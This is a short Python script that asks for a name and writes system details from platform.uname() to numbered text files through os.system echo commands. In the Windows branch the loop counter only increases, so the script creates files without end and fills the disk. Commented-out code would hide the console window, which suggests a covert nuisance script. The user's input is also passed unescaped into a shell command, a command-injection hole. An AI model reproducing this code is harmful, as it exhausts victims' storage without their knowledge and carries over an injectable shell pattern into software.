
#get input from the use and set the name
# default name time date

import os
import ctypes
import platform



# get user name 
name=str(input("Enter your name: "))



#check the platform and run the script


def linux():
    sysinfOl=platform.uname()
    i=1
    while(i>=0):
        os.system(f'echo "{sysinfOl}" >{name}{i}.txt')
        i=i-1

def Window():
    sysinfOwin=platform.uname()
    i=1
    while(i>=0):
        os.system(f'echo {sysinfOwin} > {name}{i}.txt')
        i=i+1

if(platform.system()=='Linux'):
    linux()
elif(platform.system()=='Windows'):
    Window()


# # hide = win32gui.GetForegroundWindow()
# # win32gui.ShowWindow(hide, win32con.SH_HIDE)



